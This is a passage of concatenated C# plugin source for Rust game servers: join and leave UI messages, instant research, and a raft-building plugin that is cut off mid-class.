        			if (ShowGUI == false)
        			{
				        string message = formatconnectUI.Replace("{Name}", $"{color(colorname, Name)}");
        				var RankElements = new CuiElementContainer();
        				var Choose = RankElements.Add(new CuiPanel
        				{
        					Image = {Color = "0.1 0.1 0.1 0"},
        					RectTransform = {AnchorMin = $"{AnchorMinUI}", AnchorMax = $"{AnchorMaxUI}"},
        				}, "Hud", "ConnectGUI");
        	
        				RankElements.Add(new CuiElement
        				{
        					Parent = "ConnectGUI",
        					Components =
        					{
        						new CuiTextComponent()
        						{
        							Text = message ,
        							Align = TextAnchor.MiddleLeft,
        							Color = "1 1 1 1",
        							Font = FontName,
        							FontSize = FontSizeText
        						},
        						new CuiRectTransformComponent {AnchorMin = "0 0", AnchorMax = "1 1"},
        						new CuiOutlineComponent() {Color = "0 0 0 1", Distance = "0.5 1"}
        					}
        				});
        				CuiHelper.AddUi(player, RankElements);
        		    }
        		}

		#endregion
		
		#region config
		private new void LoadDefaultConfig()
		{
			PrintWarning("Создание нового файла конфигурации... | Благодарим за покупку данного плагина");
			LoadConfig();
		}
		
		private new void LoadConfig()
		{
			GetConfig("Настройка Префикса", "Цвет префикса", ref colorprefix);
			GetConfig("Настройка Префикса", "Префикс", ref Prefix);
			GetConfig("Настройка Префикса", "Отображать префикс?", ref ShowPrefix);
			GetConfig("Основные настройки","Показывать оповещение о входе в чат вместо UI", ref ShowGUI);
			GetConfig("Основные настройки", "Показывать отключение игроков", ref ShowDisconnect);
			GetConfig("Основные настройки", "Показывать админа при подключение?", ref showconnectadmin);
			GetConfig("Формат сообщения","Присоединение CHAT", ref formatconnectChat);
			GetConfig("Формат сообщения","Присоединение UI", ref formatconnectUI);
			GetConfig("Формат сообщения","Отключение CHAT", ref formatLeaveChat);
			GetConfig("Настройка UI", "Расположение панели Min", ref AnchorMinUI);
			GetConfig("Настройка UI", "Расположение панели Max", ref AnchorMaxUI);
			GetConfig("Настройка UI","Размер текста", ref FontSizeText);
			GetConfig("Настройка UI", "Цвет ника при подключение", ref colorname);
			GetConfig("Настройка UI","Шрифт Текст", ref FontName);
			SaveConfig();
			
		}
		private void GetConfig<T>(string menu, string Key, ref T var)
		{
			if (Config[menu, Key] != null)
			{
				var = (T)Convert.ChangeType(Config[menu, Key], typeof(T));
			}

			Config[menu, Key] = var;
		}
		#endregion
		
		string color(string color, string text)
		{
			return $"<color={color}>{text}</color>";
		}


		string getMessageFormat(BasePlayer player, string type)
		{
			if (type == "Join")
			{
				string message = formatconnectChat.Replace("{PLAYER}", $"{color(colorname, player.displayName)}");
				if (ShowPrefix)
					return $"{color(colorprefix, Prefix)} {message}";
				return message;
			}
			if (type == "Leave")
			{
				string reason;
				string message = formatLeaveChat.Replace("{PLAYER}", $"{color(colorname, player.displayName)}"); 
				if (ShowPrefix)
					return $"{color(colorprefix, Prefix)} {message}";
				return message;
			}
			return "Ошибка";
		}
		
		void OnPlayerDisconnected(BasePlayer player, string reason)
		{
			Puts($"<color=#fff>[{Prefix}]</color> {player.displayName} вышел со сервера [Причина: {reason}]");
			LogToFile("disconnect", $"[{DateTime.Now.ToShortTimeString()}] {player.displayName} вышел со сервера [Причина: {reason}]", this, true);
			
			foreach (BasePlayer sender in BasePlayer.activePlayerList)
				PrintToConsole(sender, $"<color=#fff>{Prefix}</color> <color=#fff>{player.displayName}</color> вышел со сервера [Причина: <color=#fff>{reason}</color>]");
			
			if (ShowDisconnect == true)
			{
				sendLeaveMessage(player, reason);
			}
		}
		
		void sendLeaveMessage(BasePlayer player, string reason)
		{
			if (ShowGUI == true)
			{
				string text = getMessageFormat(player, "Leave");
				foreach (BasePlayer p in BasePlayer.activePlayerList)
					PrintToChat(p, text, reason);
				foreach (BasePlayer sender in BasePlayer.activePlayerList)
					PrintToConsole(sender, text, reason);
			}
		}
		
		void sendJoinMessage(BasePlayer player)
		{
			if (ShowGUI == true)
			{
				string text = getMessageFormat(player, "Join");
				if (showconnectadmin == false)
				{
					if (player.IsAdmin)
					{
						string connect = $"Вы успешно присоединились скрывая личность";
						if (ShowPrefix)
							connect = $"<color={colorprefix}>{Prefix}</color> Вы успешно присоединились скрывая личность";
						PrintToChat(player, connect);
					}
					else
					{
						foreach (BasePlayer p in BasePlayer.activePlayerList)
						{
							PrintToChat(p, text);
							PrintToConsole(p, $"<color=#fff>{Prefix}</color> <color=#fff>{player.displayName}</color> присоединился к игре");
						}		
					}
				}
				else
				{
					foreach (BasePlayer p in BasePlayer.activePlayerList)
						PrintToChat(p, text);
				}
			}
			foreach (BasePlayer sender in BasePlayer.activePlayerList)
				PrintToConsole(sender, $"<color=#fff>{Prefix}</color> <color=#fff>{player.displayName}</color> присоединился к игре");
		}
	}
}

// --- End of file: UIConnect.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/InstantResearch.cs ---
// --- Original Local Path: InstantResearch.cs ---

namespace Oxide.Plugins
{
    [Info("Instant Research", "Artasan", 1.0)]
    [Description("Allows instant research.")]
    public class InstantResearch : RustPlugin
    {
        void OnServerInitialized()
        {
            updateResearchTables();
        }

        void OnItemDeployed(Deployer deployer, BaseEntity deployedEntity)
        {
            Item item = deployer.GetItem();

            if (item.info.shortname == "research_table")
            {
                updateResearchTables();
            }
        }

        void OnItemResearchStart(ResearchTable table)
            {
            table.researchDuration = 0f;
            }

        public void updateResearchTables()
		{}
    }
}


// --- End of file: InstantResearch.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/Raft.cs ---
// --- Original Local Path: Raft.cs ---

using System;
using Oxide.Core;
using Oxide.Core.Configuration;
using Network;
using System.Runtime.CompilerServices;
using System.Collections.Generic;
using UnityEngine;
using Facepunch;
using System.Linq;

namespace Oxide.Plugins
{
    [Info("Raft", "Colon Blow", "1.0.24")]
    class Raft : RustPlugin
    {
        #region Hooks

        BaseEntity newRaft;
        static Dictionary<ulong, string> hasRaft = new Dictionary<ulong, string>();

        static List<uint> storedRafts = new List<uint>();
        private DynamicConfigFile data;
        private bool initialized;

        void Loaded()
        {
            LoadVariables();
            permission.RegisterPermission("raft.builder", this);
            lang.RegisterMessages(Messages, this);
            data = Interface.Oxide.DataFileSystem.GetFile("raft_data");
        }

        private void OnServerInitialized()
        {
            initialized = true;
            LoadData();
            timer.In(3, RestoreRafts);
        }
        private void OnServerSave()
        {
            SaveData();
        }

        private void RestoreRafts()
        {
            if (storedRafts.Count > 0)
            {
                BaseEntity[] objects = BaseEntity.saveList.Where(x => x is BaseEntity).ToArray();
                if (objects != null)
                {
                    foreach (var obj in objects)
                    {
                        if (!obj.IsValid() || obj.IsDestroyed)
                            continue;

                        if (storedRafts.Contains(obj.net.ID))
                        {
                            bool hassail = false;
                            bool hasfire = false;
                            bool hasnet = false;
                            bool hasroof = false;
                            bool haswalls = false;
                            bool haschairs = false;
                            string codestr = "0";
                            string guestcodestr = "0";
                            foreach (Transform child in obj.GetComponent<Transform>())
                            {
                                if (child == null) continue;
                                if (child.name.Contains("wall.frame.garagedoor")) hassail = true;
                                if (child.name.Contains("campfire/campfire")) hasfire = true;
                                if (child.name.Contains("wall.frame.netting")) hasnet = true;
                                if (child.name.Contains("chair/chair") && child != obj) haschairs = true;
                                if (child.name.Contains("sign.post.single") && (child.GetComponent<BaseEntity>().skinID != 1)) hasroof = true;
                                if (child.name.Contains("sign.large.wood") && (child.GetComponent<BaseEntity>().skinID == 1)) haswalls = true;
                                if (child.name.Contains("keypad/lock.code"))
                                {
                                    CodeLock codelock = child.GetComponent<CodeLock>() ?? null;
                                    if (codelock != null) codestr = codelock.code;
                                    if (codelock != null) guestcodestr = codelock.guestCode;
                                }
                            }

                            var spawnpos = obj.transform.position;
                            var spawnrot = obj.transform.rotation;
                            var userid = obj.OwnerID;
                            storedRafts.Remove(obj.net.ID);
                            SaveData();
                            obj.Invoke("KillMessage", 0.1f);
                            timer.Once(2f, () => RespawnRaft(spawnpos, spawnrot, userid, hassail, hasfire, hasnet, hasroof, haswalls, haschairs, codestr, guestcodestr));
                        }
                    }
                }
            }
        }

        void SaveData() => data.WriteObject(storedRafts.ToList());
        void LoadData()
        {
            try
            {
                storedRafts = data.ReadObject<List<uint>>();
            }
            catch
            {
                storedRafts = new List<uint>();
            }
        }

        bool isAllowed(BasePlayer player, string perm) => permission.UserHasPermission(player.UserIDString, perm);

        public void AddPlayerRaft(ulong id)
        {
            if (!OnlyOneActiveRaft) return;
            if (hasRaft.ContainsKey(id)) return;
            hasRaft.Add(id, "");
        }

        public void RemovePlayerRaft(ulong id)
        {
            if (!OnlyOneActiveRaft) return;
            if (!hasRaft.ContainsKey(id)) return;
            hasRaft.Remove(id);
        }

        public void BuildRaft(BasePlayer player)
        {
            string prefabstr = "assets/prefabs/deployable/chair/chair.deployed.prefab";
            var waterheight = TerrainMeta.WaterMap.GetHeight(player.transform.position);
            var spawnpos = new Vector3(player.transform.position.x, waterheight, player.transform.position.z);
            newRaft = GameManager.server.CreateEntity(prefabstr, spawnpos + new Vector3(0f, 0.4f, 0f), new Quaternion(), true);
            var mount = newRaft.GetComponent<BaseMountable>();
            mount.isMobile = true;
            newRaft.enableSaving = true;
            newRaft.OwnerID = player.userID;
            newRaft?.Spawn();
            var addraft = newRaft.gameObject.AddComponent<RaftEntity>();
            AddPlayerRaft(player.userID);
            storedRafts.Add(newRaft.net.ID);
            mount.MountPlayer(player);
            SaveData();
        }

        public void RespawnRaft(Vector3 spawnpos, Quaternion spawnrot, ulong userid, bool hassail, bool hasfire, bool hasnet, bool hasroof, bool haswalls, bool haschairs, string codestr, string guestcodestr)
        {
            string prefabstr = "assets/prefabs/deployable/chair/chair.deployed.prefab";
            newRaft = GameManager.server.CreateEntity(prefabstr, spawnpos, spawnrot, true);
            var mount = newRaft.GetComponent<BaseMountable>() ?? null;
            if (mount != null) mount.isMobile = true;
            newRaft.enableSaving = true;
            newRaft.OwnerID = userid;
            newRaft?.Spawn();
            var addraft = newRaft.gameObject.AddComponent<RaftEntity>();
            if (hassail) addraft.SpawnSail();
            if (hasfire) addraft.SpawnCampfire();
            if (hasnet) addraft.SpawnNet();
            if (hasroof) addraft.SpawnRoof();
            if (haswalls) addraft.SpawnSideWalls();
            if (haschairs) addraft.SpawnPassengerChairs();
            if (codestr != "0")
            {
                var codelock = addraft.boatlock.GetComponent<CodeLock>() ?? null;
                if (codelock != null)
                {
                    codelock.whitelistPlayers.Add(userid);
                    codelock.code = codestr;
                    codelock.guestCode = guestcodestr;
                    codelock.SetFlag(BaseEntity.Flags.Locked, true, false);
                }
            }
            AddPlayerRaft(userid);
            storedRafts.Add(newRaft.net.ID);
            SaveData();
        }

        void ScrapRaft(BasePlayer player)
        {
            Item woodrefund = ItemManager.CreateByItemID(-151838493, RefundForScrap);
            player.inventory.GiveItem(woodrefund, null);
            player.Command("note.inv", -151838493, RefundForScrap);
        }

        bool CheckUpgradeMats(BasePlayer player, int itemID, int amount, string str)
        {
            int HasReq = player.inventory.GetAmount(itemID);
            if (HasReq >= amount)
            {
                player.inventory.Take(null, itemID, amount);
                player.Command("note.inv", itemID, -amount);
                return true;
            }
            ItemDefinition itemDefinition = ItemManager.FindItemDefinition(itemID);

            SendReply(player, "You need " + amount + " " + itemDefinition.shortname + " to build " + str);
            return false;
        }

        public bool IsStandingInWater(BasePlayer player)
        {
            var position = player.transform.position;
            var waterdepth = (TerrainMeta.WaterMap.GetHeight(position) - TerrainMeta.HeightMap.GetHeight(position));
            if (waterdepth >= 0.6f) return true;
            return false;
        }

        private void OnPlayerInput(BasePlayer player, InputState input)
        {
            if (!player.isMounted) return;
            var activeraft = player.GetMounted().GetComponentInParent<RaftEntity>() ?? null;
            if (activeraft == null) return;
            if (player.GetMounted() != activeraft.entity) return;
            if (activeraft.boatlock.IsLocked() == true) return;
            if (input != null)
            {
                if (input.WasJustPressed(BUTTON.FORWARD)) { activeraft.setsail = false; activeraft.moveforward = true; }
                if (input.WasJustReleased(BUTTON.FORWARD)) { activeraft.moveforward = false; }
                if (input.WasJustPressed(BUTTON.BACKWARD)) { activeraft.setsail = false; activeraft.movebackward = true; }
                if (input.WasJustReleased(BUTTON.BACKWARD)) { activeraft.movebackward = false; }
                if (input.WasJustPressed(BUTTON.RIGHT)) { activeraft.rotright = true; }
                if (input.WasJustReleased(BUTTON.RIGHT)) { activeraft.rotright = false; }
                if (input.WasJustPressed(BUTTON.LEFT)) { activeraft.rotleft = true; }
                if (input.WasJustReleased(BUTTON.LEFT)) { activeraft.rotleft = false; }
                if (input.WasJustPressed(BUTTON.JUMP))
                {
                    activeraft.ismoving = false;
                    activeraft.moveforward = false;
                    activeraft.movebackward = false;
                    activeraft.rotright = false;
                    activeraft.rotleft = false;
                    activeraft.setsail = false;
                }
                return;
            }
        }

        void OnEntityDeath(BaseCombatEntity entity, HitInfo info)
        {
            if (entity == null) return;
            if (storedRafts.Contains(entity.net.ID))
            {
                storedRafts.Remove(entity.net.ID);
                SaveData();
            }
        }

        object OnEntityGroundMissing(BaseEntity entity)
        {
            var raft = entity.GetComponentInParent<RaftEntity>() ?? null;
            if (raft != null) return false;
            return null;
        }

        void OnEntityMounted(BaseMountable mountable, BasePlayer player)
        {
            if (mountable == null || player == null) return;
            var raftentity = mountable.GetComponentInParent<RaftEntity>() ?? null;
            if (raftentity == null) return;
            if (mountable.GetComponent<BaseEntity>() != raftentity.entity) return;
            if (raftentity != null && raftentity.player == null)
            {
                SendReply(player, msg("captain", player.UserIDString));
            }
        }

        void OnEntityTakeDamage(BaseCombatEntity entity, HitInfo hitInfo)
        {
            if (entity == null || hitInfo == null) return;
            var isboat = entity.GetComponentInParent<RaftEntity>() ?? null;
            if (isboat != null) hitInfo.damageTypes.ScaleAll(0);
            return;
        }

        object CanPickupEntity(BaseCombatEntity entity, BasePlayer player)
        {
            if (entity == null || player == null) return null;
            var raft = entity.GetComponentInParent<RaftEntity>() ?? null;
            if (raft != null) return false;
            return null;
        }

        object CanPickupLock(BasePlayer player, BaseLock baseLock)
        {
            if (baseLock == null || player == null) return null;
            if (baseLock.GetComponentInParent<RaftEntity>()) return false;
            return null;
        }

        void Unload()
        {
            foreach (var player in BasePlayer.activePlayerList)
            {
                if (player.isMounted)
                {
                    var activeraft = player.GetMounted().GetComponentInParent<RaftEntity>() ?? null;
                    if (activeraft != null) player.DismountObject();
                }
            }
        }

        void DestroyAll<T>()
        {
            var objects = GameObject.FindObjectsOfType(typeof(T));
            if (objects != null)
                foreach (var gameObj in objects)
                    GameObject.Destroy(gameObj);
        }

        #endregion

        #region Commands

        [ChatCommand("raft")]
        void cmdChatRaftHelp(BasePlayer player, string command, string[] args)
        {
            if (!isAllowed(player, "raft.builder")) { SendReply(player, msg("notauthorized", player.UserIDString)); return; }
            string raftstr = "/raft.build - need " + MaterialsForRaft + " Wood to Build a raft.";
            string roofstr = "/raft.addroof - need " + MaterialsForRoof + " Wood to add a Roof.";
            string wallsstr = "/raft.addwalls - need " + MaterialsForWalls + " Wood to add Walls.";
            string sailstr = "/raft.addsail - need " + MaterialsForSail + " Wood to add a Sail.";
            string netstr = "/raft.addnet - need " + MaterialsForNet + " Rope to add Netting.";
            string firestr = "/raft.addfire - need " + MaterialsForCampfire + " Wood to add a Campfire.";
            string chairsstr = "/raft.addchairs - need" + MaterialsForChairs + " Wood to add Chairs";
            string destroystr = "/raft.destroy - Destroys raft give back " + RefundForScrap + " wood.";
            string locationstr = "/raft.loc - Shows X and Y location Coordinates.";
            string sailmodestr = "/raft.setsail - Enables Sailing Mode.";
            string stashstr = "/raft.stash - Toggles stash hidden from others or not.";
            string consolestr = "To fix invisible parts, hit F1, then type culling.env 0 in console";
            SendReply(player, " Raft Chat Commands (while seated): \n " + raftstr + " \n " + roofstr + " \n " + wallsstr + " \n " + sailstr + " \n " + netstr + " \n " + firestr + " \n " + chairsstr + " \n " + destroystr + " \n " + locationstr + " \n " + sailmodestr + " \n " + stashstr + " \n " + consolestr);
        }

        [ChatCommand("raft.build")]
        void cmdChatRaftBuild(BasePlayer player, string command, string[] args)
        {
            if (OnlyOneActiveRaft && hasRaft.ContainsKey(player.userID)) { SendReply(player, msg("hasraftalready", player.UserIDString)); return; }
            if (!isAllowed(player, "raft.builder")) { SendReply(player, msg("notauthorized", player.UserIDString)); return; }
            if (!IsStandingInWater(player) || player.IsSwimming()) { SendReply(player, msg("notstandingwater", player.UserIDString)); return; }
            if (player.isMounted) return;
            if (CheckUpgradeMats(player, -151838493, MaterialsForRaft, "Base Raft")) BuildRaft(player);
        }

        [ConsoleCommand("raft.build")]
        void cmdConsoleRaftBuild(ConsoleSystem.Arg arg)
        {
            var player = arg.Player();
            if (OnlyOneActiveRaft && hasRaft.ContainsKey(player.userID)) { SendReply(player, msg("hasraftalready", player.UserIDString)); return; }
            if (!isAllowed(player, "raft.builder")) { SendReply(player, msg("notauthorized", player.UserIDString)); return; }
            if (!IsStandingInWater(player) || player.IsSwimming()) { SendReply(player, msg("notstandingwater", player.UserIDString)); return; }
            if (player.isMounted) return;
            if (CheckUpgradeMats(player, -151838493, MaterialsForRaft, "Base Raft")) BuildRaft(player);
        }

        [ChatCommand("raft.addwalls")]
        void cmdRaftAddWalls(BasePlayer player, string command, string[] args)
        {
            if (!isAllowed(player, "raft.builder")) { SendReply(player, msg("notauthorized", player.UserIDString)); return; }
            if (!player.isMounted) return;
            var activeraft = player.GetMounted().GetComponentInParent<RaftEntity>();
            if (activeraft == null) return;
            if (activeraft.haswalls) { SendReply(player, msg("alreadyadded", player.UserIDString)); return; }
            if (CheckUpgradeMats(player, -151838493, MaterialsForWalls, "Walls")) activeraft.SpawnSideWalls();
        }

        [ConsoleCommand("raft.addwalls")]
        void cmdConsoleRaftAddWalls(ConsoleSystem.Arg arg)
        {
            var player = arg.Player();
            if (!isAllowed(player, "raft.builder")) { SendReply(player, msg("notauthorized", player.UserIDString)); return; }
            if (!player.isMounted) return;
            var activeraft = player.GetMounted().GetComponentInParent<RaftEntity>();
            if (activeraft == null) return;
            if (activeraft.haswalls) { SendReply(player, msg("alreadyadded", player.UserIDString)); return; }
            if (CheckUpgradeMats(player, -151838493, MaterialsForWalls, "Walls")) activeraft.SpawnSideWalls();
        }

        [ChatCommand("raft.addroof")]
        void cmdRaftAddRoof(BasePlayer player, string command, string[] args)
        {
            if (!isAllowed(player, "raft.builder")) { SendReply(player, msg("notauthorized", player.UserIDString)); return; }
            if (!player.isMounted) return;
            var activeraft = player.GetMounted().GetComponentInParent<RaftEntity>() ?? null;
            if (activeraft == null) return;
            if (activeraft.hasroof) { SendReply(player, msg("alreadyadded", player.UserIDString)); return; }
            if (CheckUpgradeMats(player, -151838493, MaterialsForRoof, "Roof")) activeraft.SpawnRoof();
        }

        [ConsoleCommand("raft.addroof")]
        void cmdConsoleRaftAddRoof(ConsoleSystem.Arg arg)
        {
            var player = arg.Player();
            if (!isAllowed(player, "raft.builder")) { SendReply(player, msg("notauthorized", player.UserIDString)); return; }
            if (!player.isMounted) return;
            var activeraft = player.GetMounted().GetComponentInParent<RaftEntity>() ?? null;
            if (activeraft == null) return;
            if (activeraft.hasroof) { SendReply(player, msg("alreadyadded", player.UserIDString)); return; }
            if (CheckUpgradeMats(player, -151838493, MaterialsForRoof, "Roof")) activeraft.SpawnRoof();
        }

        [ChatCommand("raft.addsail")]
        void cmdRaftAddSail(BasePlayer player, string command, string[] args)
        {
            if (!isAllowed(player, "raft.builder")) { SendReply(player, msg("notauthorized", player.UserIDString)); return; }
            if (!player.isMounted) return;
            var activeraft = player.GetMounted().GetComponentInParent<RaftEntity>() ?? null;
            if (activeraft == null) return;
            if (activeraft.hassail) { SendReply(player, msg("alreadyadded", player.UserIDString)); return; }
            if (CheckUpgradeMats(player, -151838493, MaterialsForSail, "Sail")) activeraft.SpawnSail();
        }

        [ConsoleCommand("raft.addsail")]
        void cmdConsoleRaftAddSail(ConsoleSystem.Arg arg)
        {
            var player = arg.Player();
            if (!isAllowed(player, "raft.builder")) { SendReply(player, msg("notauthorized", player.UserIDString)); return; }
            if (!player.isMounted) return;
            var activeraft = player.GetMounted().GetComponentInParent<RaftEntity>() ?? null;
            if (activeraft == null) return;
            if (activeraft.hassail) { SendReply(player, msg("alreadyadded", player.UserIDString)); return; }
            if (CheckUpgradeMats(player, -151838493, MaterialsForSail, "Sail")) activeraft.SpawnSail();
        }

        [ChatCommand("raft.addfire")]
        void cmdRaftAddFire(BasePlayer player, string command, string[] args)
        {
            if (!isAllowed(player, "raft.builder")) { SendReply(player, msg("notauthorized", player.UserIDString)); return; }
            if (!player.isMounted) return;
            var activeraft = player.GetMounted().GetComponentInParent<RaftEntity>() ?? null;
            if (activeraft == null) return;
            if (activeraft.hasfire) { SendReply(player, msg("alreadyadded", player.UserIDString)); return; }
            if (CheckUpgradeMats(player, -151838493, MaterialsForCampfire, "Campfire")) activeraft.SpawnCampfire();
        }

        [ConsoleCommand("raft.addfire")]
        void cmdConsoleRaftAddFire(ConsoleSystem.Arg arg)
        {
            var player = arg.Player();
            if (!isAllowed(player, "raft.builder")) { SendReply(player, msg("notauthorized", player.UserIDString)); return; }
            if (!player.isMounted) return;
            var activeraft = player.GetMounted().GetComponentInParent<RaftEntity>() ?? null;
            if (activeraft == null) return;
            if (activeraft.hasfire) { SendReply(player, msg("alreadyadded", player.UserIDString)); return; }
            if (CheckUpgradeMats(player, -151838493, MaterialsForCampfire, "Campfire")) activeraft.SpawnCampfire();
        }

        [ChatCommand("raft.addchairs")]
        void cmdRaftAddChairs(BasePlayer player, string command, string[] args)
        {
            if (!isAllowed(player, "raft.builder")) { SendReply(player, msg("notauthorized", player.UserIDString)); return; }
            if (!player.isMounted) return;
            var activeraft = player.GetMounted().GetComponentInParent<RaftEntity>() ?? null;
            if (activeraft == null) return;
            if (activeraft.haschairs) { SendReply(player, msg("alreadyadded", player.UserIDString)); return; }
            if (CheckUpgradeMats(player, 1534542921, MaterialsForChairs, "Chairs")) activeraft.SpawnPassengerChairs();
        }

        [ConsoleCommand("raft.addchairs")]
        void cmdConsoleRaftAddChairs(ConsoleSystem.Arg arg)
        {
            var player = arg.Player();
            if (!isAllowed(player, "raft.builder")) { SendReply(player, msg("notauthorized", player.UserIDString)); return; }
            if (!player.isMounted) return;
            var activeraft = player.GetMounted().GetComponentInParent<RaftEntity>() ?? null;
            if (activeraft == null) return;
            if (activeraft.haschairs) { SendReply(player, msg("alreadyadded", player.UserIDString)); return; }
            if (CheckUpgradeMats(player, 1534542921, MaterialsForChairs, "Chairs")) activeraft.SpawnPassengerChairs();
        }

        [ChatCommand("raft.addnet")]
        void cmdRaftAddNet(BasePlayer player, string command, string[] args)
        {
            if (!isAllowed(player, "raft.builder")) { SendReply(player, msg("notauthorized", player.UserIDString)); return; }
            if (!player.isMounted) return;
            var activeraft = player.GetMounted().GetComponentInParent<RaftEntity>() ?? null;
            if (activeraft == null) return;
            if (!activeraft.hasroof) { SendReply(player, msg("nonet", player.UserIDString)); return; }
            if (activeraft.hasnet) { SendReply(player, msg("alreadyadded", player.UserIDString)); return; }
            if (CheckUpgradeMats(player, 1414245522, MaterialsForNet, "Net")) activeraft.SpawnNet();
        }

        [ConsoleCommand("raft.addnet")]
        void cmdConsoleRaftAddNet(ConsoleSystem.Arg arg)
        {
            var player = arg.Player();
            if (!isAllowed(player, "raft.builder")) { SendReply(player, msg("notauthorized", player.UserIDString)); return; }
            if (!player.isMounted) return;
            var activeraft = player.GetMounted().GetComponentInParent<RaftEntity>() ?? null;
            if (activeraft == null) return;
            if (!activeraft.hasroof) { SendReply(player, msg("nonet", player.UserIDString)); return; }
            if (activeraft.hasnet) { SendReply(player, msg("alreadyadded", player.UserIDString)); return; }
            if (CheckUpgradeMats(player, 1414245522, MaterialsForNet, "Net")) activeraft.SpawnNet();
        }

        [ChatCommand("raft.setsail")]
        void cmdRaftSail(BasePlayer player, string command, string[] args)
        {
            if (!isAllowed(player, "raft.builder")) { SendReply(player, msg("notauthorized", player.UserIDString)); return; }
            if (!player.isMounted) return;
            var activeraft = player.GetMounted().GetComponentInParent<RaftEntity>() ?? null;
            if (activeraft == null) return;
            if (!activeraft.hassail) return;
            var sailisin = activeraft.door.IsOpen();
            if (sailisin)
            {
                activeraft.door.SetFlag(BaseEntity.Flags.Open, false, false);
            }
            activeraft.setsail = true;
            SendReply(player, msg("setsail", player.UserIDString));
        }

        [ConsoleCommand("raft.setsail")]
        void cmdConsoleRaftSail(ConsoleSystem.Arg arg)
        {
            var player = arg.Player();
            if (!isAllowed(player, "raft.builder")) { SendReply(player, msg("notauthorized", player.UserIDString)); return; }
            if (!player.isMounted) return;
            var activeraft = player.GetMounted().GetComponentInParent<RaftEntity>() ?? null;
            if (activeraft == null) return;
            if (!activeraft.hassail) return;
            var sailisin = activeraft.door.IsOpen();
            if (sailisin)
            {
                activeraft.door.SetFlag(BaseEntity.Flags.Open, false, false);
            }
            activeraft.setsail = true;
            SendReply(player, msg("setsail", player.UserIDString));
        }

        [ChatCommand("raft.loc")]
        void cmdRaftLoc(BasePlayer player, string command, string[] args)
        {
            if (!isAllowed(player, "raft.builder")) { SendReply(player, msg("notauthorized", player.UserIDString)); return; }
            string location = player.transform.position.x + " / " + player.transform.position.z;
            SendReply(player, "you position is : " + location);
        }

        [ConsoleCommand("raft.loc")]
        void cmdConsoleRaftLoc(ConsoleSystem.Arg arg)
        {
            var player = arg.Player();
            if (!isAllowed(player, "raft.builder")) { SendReply(player, msg("notauthorized", player.UserIDString)); return; }
            string location = player.transform.position.x + " / " + player.transform.position.z;
            SendReply(player, "you position is : " + location);
        }

        [ChatCommand("raft.destroy")]
        void cmdRaftDestroy(BasePlayer player, string command, string[] args)
        {
            BaseEntity[] objects = BaseEntity.saveList.Where(x => x is BaseEntity).ToArray();
            if (objects != null)
            {
                foreach (var obj in objects)
                {
                    if (!obj.IsValid() || obj.IsDestroyed)
                        continue;

                    var israft = obj.GetComponent<RaftEntity>() ?? null;
                    if (israft != null && obj.OwnerID == player.userID)
                    {
                        storedRafts.Remove(obj.net.ID);
                        SaveData();
                        israft.entity.Invoke("KillMessage", 0.1f);
                        ScrapRaft(player);
                    }
                }
            }
        }

        [ChatCommand("raft.stash")]
        void cmdRaftStash(BasePlayer player, string command, string[] args)
        {
            if (DisableRaftStash) return;
            if (!isAllowed(player, "raft.builder")) { SendReply(player, msg("notauthorized", player.UserIDString)); return; }
            if (!player.isMounted) return;
            var activeraft = player.GetMounted().GetComponentInParent<RaftEntity>() ?? null;
            if (activeraft == null) return;
            if (activeraft.entity.OwnerID == player.userID) activeraft.ToggleStash();
            return;
        }

        #endregion

        #region Raft Entity

        public class RaftEntity : BaseEntity
        {
            Raft raft;
            public BaseEntity entity;
            BaseEntity floor1;
            BaseEntity floor2;
            BaseEntity barrel1;
            BaseEntity barrel2;
            BaseEntity barrel3;
            BaseEntity barrel4;
            BaseEntity barrel5;
            BaseEntity barrel6;
            BaseEntity backtop;
            BaseEntity backside1;
            BaseEntity backside2;
            BaseEntity rudder;
            BaseEntity pole1;
            BaseEntity pole2;
            BaseEntity pole3;
            BaseEntity pole4;
            public BaseEntity roof1;
            public BaseEntity roof2;
            BaseOven fire;
            BaseOven lantern;
            public BaseEntity net1;
            public BaseEntity door;
            BaseEntity door2;
            BaseEntity chairbackright;
            BaseEntity chairbackleft;
            BaseEntity stash;
            BaseEntity lootbarrel;
            public BaseEntity boatlock;

            Vector3 entitypos;
            Quaternion entityrot;
            public BasePlayer player;
            ulong ownerid;
            int counter;
            bool lootready;
            public bool ismoving;
            public bool moveforward;
            public bool movebackward;
            public bool rotright;
            public bool rotleft;
            public bool setsail;
            public bool hasroof;
            public bool haswalls;
            public bool hassail;
            public bool hasfire;
            public bool hasnet;
            public bool haschairs;
            bool spawnfullybuilt;
            Vector3 movedirection;
            Vector3 rotdirection;
            Vector3 startloc;
            Vector3 startrot;
            Vector3 endloc;
            float steps;
            float sailsteps;
            float incrementor;
            float waterheight;
            float groundheight;
            public float ghitDistance;
            public float whitDistance;
            private static int waterlayer;
            private static int groundlayer;
            private static int buildinglayer;

            void Awake()
            {
                entity = GetComponent<BaseEntity>();
                entitypos = entity.transform.position;
                entityrot = Quaternion.identity;
                ownerid = entity.OwnerID;
                raft = new Raft();
                waterlayer = UnityEngine.LayerMask.GetMask("Water");
                groundlayer = UnityEngine.LayerMask.GetMask("Terrain", "World", "Construction", "Default");
                buildinglayer = UnityEngine.LayerMask.GetMask("World", "Construction", "Default");
                counter = 0;
                incrementor = 0;
                ismoving = false;
                moveforward = false;
                movebackward = false;
                rotright = false;
                rotleft = false;
                setsail = false;
                hasroof = false;
                haswalls = false;
                hassail = false;
                hasfire = false;
                hasnet = false;
                haschairs = false;
                lootready = true;
                startrot = entity.transform.eulerAngles;
                startloc = entity.transform.position;
                steps = DefaultRaftMovementSpeed;
                sailsteps = DefaultRaftSailingSpeed;
                spawnfullybuilt = SpawnFullyBuilt;

                SpawnRaft();
                SpawnLock();
                if (!DisableRaftStash) SpawnStash();
                if (SpawnFullyBuilt)
                {
                    SpawnSideWalls();
                    SpawnRoof();
                    SpawnCampfire();
                    SpawnNet();
                    SpawnSail();
                    SpawnPassengerChairs();
                }
                RefreshAll();
            }

            public void SpawnStash()
            {
                string prefabstash = "assets/prefabs/deployable/small stash/small_stash_deployed.prefab";
                stash = GameManager.server.CreateEntity(prefabstash, entitypos, entityrot, false);
                stash.transform.localEulerAngles = new Vector3(0, 0, 0);
                stash.transform.localPosition = new Vector3(0f, 0f, 0f);
                var stashcont = stash.GetComponent<StashContainer>();
                stashcont.uncoverRange = -1f;
                stashcont.burriedOffset = 1f;
                var stashstab = stash.GetComponent<StabilityEntity>();
                if (stashstab) stashstab.grounded = true;
                stash.OwnerID = ownerid;
